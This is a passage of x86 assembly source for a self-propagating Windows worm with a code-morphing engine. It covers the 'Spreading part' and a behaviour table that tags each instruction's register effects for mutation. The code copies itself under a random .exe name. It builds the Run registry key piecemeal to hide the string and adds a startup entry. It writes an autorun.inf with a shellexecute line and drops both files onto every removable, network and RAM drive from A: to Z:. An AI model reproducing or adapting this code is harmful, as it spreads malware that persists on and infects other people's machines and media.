; #####   Spreading part
; #####

CopyFileAndRegEntry:
	cc rS,	     xor,     esi, esi
	CopyFileAndRegEntryMore:
		cc rBS,      mov,     ebx, 26
		cc rBCS,     mov,     ecx, 97
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rS,	     mov,     byte[RandomFileName+esi], dl
		cc rS,	     inc,     esi
		cc rSF,      cmp,     esi, 8
	cc rNoEmul,  jb,     CopyFileAndRegEntryMore

	cc rA,	     mov,     eax, ".exe"
	cc rNoRes,   mov,     dword[RandomFileName+esi], eax

	cc rA,	     mov,     al, "C"
	cc rNoRes,   mov,     byte[SpaceForHDC+1], al
	cc rA,	     mov,     al, ":"
	cc rNoRes,   mov,     byte[SpaceForHDC+2], al
	cc rA,	     mov,     al, "\"
	cc rNoRes,   mov,     byte[SpaceForHDC+3], al

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoRes,   push,    dword[hMyFileName]
	cc rNoEmul,  stdcall, dword[_CopyFileA]

;  Encrypted representation of "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
;  Will be a very good surface for this morphism

	cc rA,	     mov,     eax, stKey
	cc rAB,      mov,     ebx, "SOFT"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "WARE"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "\Mic"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "roso"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "ft\W"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "indo"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "ws\C"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "urre"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "ntVe"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "rsio"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     ebx, "n\Ru"
	cc rA,	     mov,     dword[eax], ebx
	cc rA,	     add,     eax, 0x4
	cc rAB,      mov,     bl, "n"
	cc rA,	     mov,     byte[eax], bl

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    hKey
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    KEY_ALL_ACCESS
	cc rNoRes,   push,    REG_OPTION_NON_VOLATILE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    stKey
	cc rNoRes,   push,    HKEY_LOCAL_MACHINE
	cc rNoEmul,  stdcall, dword[_RegCreateKeyExA]

	cc rNoRes,   push,    16
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoRes,   push,    REG_SZ
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hKey]
	cc rNoEmul,  stdcall, dword[_RegSetValueExA]

	cc rNoRes,   push,    dword[hKey]
	cc rNoEmul,  stdcall, dword[_RegCloseKey]

	cc rNoEmul,  call,    OpenRandomFileRead

	cc rA,	     xor,     eax, eax
	cc rA,	     add,     eax, "X:\a"
	cc rNoRes,   mov,     dword[stAutorunWithDrive], eax
	cc rA,	     mov,     eax, "\aut"
	cc rNoRes,   mov,     dword[stAutorunWithDrive+2], eax
	cc rA,	     mov,     eax, "orun"
	cc rNoRes,   mov,     dword[stAutoruninf+3], eax
	cc rA,	     mov,     eax, ".inf"
	cc rNoRes,   mov,     dword[stAutoruninf+7], eax

	cc rA,	     mov,     eax, "[Aut"
	cc rNoRes,   mov,     dword[stAutoRunContent], eax
	cc rA,	     mov,     eax, "orun"
	cc rNoRes,   mov,     dword[stAutoRunContent+0x04], eax
	cc rA,	     mov,     eax, 0x530A0D5D
	cc rNoRes,   mov,     dword[stAutoRunContent+0x08], eax
	cc rA,	     mov,     eax, "hell"			 ; !!!!!!!
	cc rNoRes,   mov,     dword[stAutoRunContent+0x0C], eax
	cc rA,	     mov,     eax, "Exec"
	cc rNoRes,   mov,     dword[stAutoRunContent+0x10], eax
	cc rA,	     mov,     eax, "ute="
	cc rNoRes,   mov,     dword[stAutoRunContent+0x14], eax
	cc rA,	     mov,     eax, dword[RandomFileName]	; Filename: XXXXxxxx.exe
	cc rNoRes,   mov,     dword[stAutoRunContent+0x18], eax
	cc rA,	     mov,     eax, dword[RandomFileName+0x4]	; Filename: xxxxXXXX.exe
	cc rNoRes,   mov,     dword[stAutoRunContent+0x1C], eax
	cc rA,	     mov,     eax, ".exe"
	cc rNoRes,   mov,     dword[stAutoRunContent+0x20], eax
	cc rA,	     mov,     eax, 0x73550A0D
	cc rNoRes,   mov,     dword[stAutoRunContent+0x24], eax
	cc rA,	     mov,     eax, "eAut"
	cc rNoRes,   mov,     dword[stAutoRunContent+0x28], eax
	cc rA,	     mov,     eax, "opla"
	cc rNoRes,   mov,     dword[stAutoRunContent+0x2C], eax
	cc rA,	     mov,     eax, 0x00313D79
	cc rNoRes,   mov,     dword[stAutoRunContent+0x30], eax



	; i like that coding style, roy g biv! :))
	cc rNoRes,   push,    51
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_ALL_ACCESS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    51
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READWRITE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_HIDDEN
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    (GENERIC_READ or GENERIC_WRITE)
	cc rNoRes,   push,    stAutoruninf

	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rA,	     push,    eax
	cc rNoRes,   mov,     dword[hCreateFileAR], eax
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rA,	     push,    eax
	cc rNoRes,   mov,     dword[hCreateFileMappingAR], eax
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]

	cc rAC,      xor,     cl, cl
	cc rACS,     mov,     esi, stAutoRunContent
	MakeAutoRunInfoMore:
		cc rABCS,    mov,     bl, byte[esi]
		cc rACS,     mov,     byte[eax], bl
		cc rACS,     inc,     eax
		cc rACS,     inc,     esi
		cc rACS,     inc,     ecx
		cc rACSF,    cmp,     cl, 51
	cc rNoEmul,  jb,      MakeAutoRunInfoMore

	cc rA,	    sub,     eax, 51
	cc rA,	    push,    dword[hCreateFileAR]
	cc rA,	    push,    dword[hCreateFileMappingAR]
	cc rA,	    push,    eax
	cc rNoEmul, stdcall, dword[_UnmapViewOfFile]
	cc rNoEmul, stdcall, dword[_CloseHandle]
	cc rNoEmul, stdcall, dword[_CloseHandle]

	cc rA,	    mov,     eax, "A:\."
	cc rNoEmul, mov,     dword[SpaceForHDC2+1], eax
	cc rA,	    mov,     eax, dword[RandomFileName]
	cc rNoEmul, mov,     dword[RandomFileName2], eax	 ; XXXXxxxx.exe
	cc rA,	    mov,     eax, dword[RandomFileName+0x04]
	cc rNoEmul, mov,     dword[RandomFileName2+0x04], eax	 ; xxxxXXXX.exe
	cc rA,	    mov,     eax, dword[RandomFileName+0x08]
	cc rNoEmul, mov,     dword[RandomFileName2+0x08], eax	 ; .exe
cc rNoEmul, ret


SpreadThisKitty:
	cc rNoEmul,  call,    CloseRandomFile

	cc rA,	     mov,     eax, 0x003A4100	     ; 0x0, "A:", 0x0
	cc rNoRes,   mov,     dword[SpaceForHDC2], eax

    STKAnotherRound:
	cc rNoRes,   push,    SpaceForHDC2+1
	cc rNoEmul,  stdcall, dword[_GetDriveTypeA]

	cc rAC,      mov,     cl, '\'
	cc rA,	     mov,     byte[SpaceForHDC2+3],cl

	cc rAF,      cmp,     al, 0x2
	cc rNoEmul,  je,      STKWithAutoRun

	cc rAF,      cmp,     al, 0x3
	cc rNoEmul,  je,      STKWithoutAutoRun

	cc rAF,      cmp,     al, 0x4
	cc rNoEmul,  je,      STKWithAutoRun

	cc rAF,      cmp,     al, 0x6
	cc rNoEmul,  je,      STKWithAutoRun

	cc rNoEmul,  jmp,     STKCreateEntriesForNextDrive

	STKWithAutoRun:

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    stAutorunWithDrive
	cc rNoRes,   push,    stAutoruninf
	cc rNoEmul,  stdcall, dword[_CopyFileA]

	STKWithoutAutoRun:

	cc rNoRes,   push,    FALSE
	cc rNoRes,   push,    SpaceForHDC2+1
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CopyFileA]


	STKCreateEntriesForNextDrive:
	cc rA,	     xor,     eax, eax
	cc rA,	     mov,     al, byte[SpaceForHDC2+1]
	cc rAF,      cmp,     al, "Z"
	cc rNoEmul,  je,      SpreadThisKittyEnd

	cc rA,	     inc,     al
	cc rA,	     mov,     byte[SpaceForHDC2+1], al	      ; next drive
	cc rA,	     mov,     byte[stAutorunWithDrive], al    ; next drive
	cc rA,	     mov,     byte[SpaceForHDC2+3], ah	      ; 0x0, "X:", 0x0
    cc rNoEmul,  jmp, STKAnotherRound

    SpreadThisKittyEnd:
	cc rNoEmul,  call,    OpenRandomFileRead
cc rNoEmul,  ret


OpenRandomFileRead:
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_NORMAL
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    GENERIC_READ
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rNoRes,   mov,     dword[hCreateFileRndFile], eax

	cc rNoRes,   push,    dFileSize
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_GetFileSize]
	cc rNoRes,   mov,     dword[dFileSize], eax

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READONLY
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rNoRes,   mov,     dword[hCreateMapRndFile], eax

	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_READ
	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]
	cc rNoRes,   mov,     dword[hMapViewRndFile], eax
	cc rNoRes,   cmp,     eax, 0x0
	cc rNoEmul,  jne,     OpenRandomFileReadNoProblem   ; Potential problems while page file
							    ; will be increased
	cc rNoEmul,  call,    CloseRandomFile
	cc rNoRes,   push,    5000
	cc rNoEmul,  stdcall, dword[_Sleep]		    ; wait 5sec and try it again
	cc rNoEmul,  jmp,     OpenRandomFileRead

	OpenRandomFileReadNoProblem:
	cc rA,	     add,     eax, CodeStartInFile
	cc rNoRes,   mov,     dword[WormCodeStart], eax
cc rNoEmul,  ret



OpenRandomFileWrite:
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_ATTRIBUTE_NORMAL
	cc rNoRes,   push,    OPEN_ALWAYS
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    GENERIC_READ or GENERIC_WRITE
	cc rNoRes,   push,    SpaceForHDC+1
	cc rNoEmul,  stdcall, dword[_CreateFileA]
	cc rNoRes,   mov,     dword[hCreateFileRndFile], eax

	cc rNoRes,   push,    dFileSize
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_GetFileSize]
	cc rNoRes,   mov,     dword[dFileSize], eax

	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    PAGE_READWRITE
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CreateFileMappingA]
	cc rNoRes,   mov,     dword[hCreateMapRndFile], eax

	cc rNoRes,   push,    dword[dFileSize]
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    0x0
	cc rNoRes,   push,    FILE_MAP_WRITE
	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_MapViewOfFile]
	cc rA,	     mov,     dword[hMapViewRndFile], eax
	cc rNoRes,   cmp,     eax, 0x0
	cc rNoEmul,  jne,     OpenRandomFileWriteNoProblem  ; Potential problems while page file
							    ; will be increased
	cc rNoEmul,  call,    CloseRandomFile
	cc rNoRes,   push,    5000
	cc rNoEmul,  stdcall, dword[_Sleep]		    ; wait 5sec and try it again
	cc rNoEmul,  jmp,     OpenRandomFileWrite

	OpenRandomFileWriteNoProblem:
	cc rA,	     add,     eax, CodeStartInFile
	cc rNoRes,   mov,     dword[WormCodeStart], eax
cc rNoEmul,  ret

CloseRandomFile:
	cc rNoRes,   push,    dword[hMapViewRndFile]
	cc rNoEmul,  stdcall, dword[_UnmapViewOfFile]

	cc rNoRes,   push,    dword[hCreateMapRndFile]
	cc rNoEmul,  stdcall, dword[_CloseHandle]

	cc rNoRes,   push,    dword[hCreateFileRndFile]
	cc rNoEmul,  stdcall, dword[_CloseHandle]
cc rNoEmul,  ret
EndPaddedCommands:
; #####
; #####   Spreading part
; #####
; ###########################################################################
; ###########################################################################


		hAnalyseBehaviourOfCode   dd AnalyseBehaviourOfCode  ; This value must be
						  ; in a protected environment
						  ; because the program has the
						  ; will to self-destruct itself
						  ; as soon as it has some freedom!!!

; ###########################################################################
; ###########################################################################
; #####
; #####   Global BehaviourTable
; #####

; Each Command has a 8bit value in the GBT
; GBT_Entry = X g f e d c b a


; a=1: EAX must have the same value
; b=1: EBX must have the same value
; c=1: ECX must have the same value
; d=1: EDX must have the same value
; e=1: EBP must have the same value
; f=1: ESI must have the same value
; g=1: EDI must have the same value
; X=1: Flags must have the same value
; ESP value must always be the same, therefore there is one bit left for Flags :))

; Special feature: If GBT_Entry=10110101 -> no execution (jumps, rets, call, ...)


GlobalBehaviourTable:
;                Command1 db 10000011b
;                Command2 db 00000011b
		 db GlobalBehaviourTableList

; #####
; #####   Global BehaviourTable
; #####
; ###########################################################################
; ###########################################################################


.end CodeStart

; "Dr." stands for "drunken" :)